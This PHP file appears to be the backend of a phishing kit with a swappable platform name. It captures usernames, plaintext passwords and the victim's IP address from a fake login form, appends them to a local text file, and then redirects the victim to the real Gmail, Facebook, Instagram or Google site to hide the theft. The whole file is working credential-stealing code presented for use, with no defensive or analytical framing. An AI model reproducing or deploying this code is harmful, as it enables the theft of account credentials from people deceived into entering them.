<?php
$platform = 'Custom';  // This will be replaced by the script

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = 'usernames.txt';
    
    // Get the IP address
    $ip = isset($_SERVER['HTTP_CLIENT_IP']) 
        ? $_SERVER['HTTP_CLIENT_IP'] 
        : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
            ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
            : $_SERVER['REMOTE_ADDR']);
    
    // Get form data
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Format the data with platform name
    $data = "Platform: " . $platform . "\n";
    $data .= "Username: " . $username . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "IP: " . $ip . "\n";
    $data .= "Date: " . date('Y-m-d H:i:s') . "\n";
    $data .= "------------------------\n\n";
    
    // Save to file
    file_put_contents($file, $data, FILE_APPEND);
    
    // Redirect based on platform
    switch(strtolower($platform)) {
        case 'gmail':
            header('Location: https://gmail.com');
            break;
        case 'facebook':
            header('Location: https://facebook.com');
            break;
        case 'instagram':
            header('Location: https://instagram.com');
            break;
        default:
            header('Location: https://google.com');
    }
    exit();
}
?>
